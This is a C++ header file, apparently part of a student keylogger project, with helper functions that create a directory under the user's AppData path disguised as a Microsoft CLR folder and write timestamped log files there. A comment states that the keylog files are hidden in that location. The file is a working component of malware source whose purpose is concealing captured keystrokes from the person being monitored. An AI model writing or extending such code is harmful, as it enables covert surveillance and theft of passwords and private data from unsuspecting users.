/*
Jacob Brown jmb7438@rit.edu
Geoffrey Kanteles gdk7676@rit.edu
*/

#ifndef LOGGING_H
#define LOGGING_H

#include <string>
#include <cstdlib>
#include <fstream>
#include "windows.h"
#include "ExtraFuncts.h"

namespace Logging
{
    /**
        Get current appdata path and return it as a string. The keylog files will be hiding here
        @param append_separator used to separate the path
        @return string of appdata path to current user
    */
    std::string GetOurPath(const bool append_separator = false)
    {
        std::string appdata_dir(getenv("APPDATA"));
        std::string full = appdata_dir + "\\Microsoft\\CLR";

        return full + (append_separator ? "\\" : "");
    }

    /**
        Make a directory with the given path
        @param path to use to make the directory
        @return True if file is created, False otherwise
    */
    bool MkOneDr(std::string path)
    {
        return (bool)CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
    }

    /**
        Make a directory with the given path
        @param path to use to make the directory
        @return True if file is created, False otherwise
    */
    bool MKDir(std::string path)
    {
        for(char &c : path)
        {
            if(c == '\\')
            {
                c = '\0';
                if(!MkOneDr(path)) return false;
                c = '\\';
            }
        }

        return true;
    }

    template <class T>
    /**
        Writes data to a log
        @param t what to write to log
        @return string of data written
    */
    std::string WriteLog(const T &t)
    {
        std::string path = GetOurPath(true);
        Helper::DateTime dt;
        std::string name = dt.GetDateTimeString("_") + ".log";

        try
        {
            std::ofstream file(path+name);
            if(!file) return "";
            std::ostringstream s;

            s << "[" << dt.GetDateTimeString() << "]" << std::endl << t << std::endl;
            std::string data = s.str();
            file << data;
            if(!file) return "";
            file.close();

            return name;
        }
        catch(...)
        {
            return "";
        }
    }
}

#endif // LOGGING_H

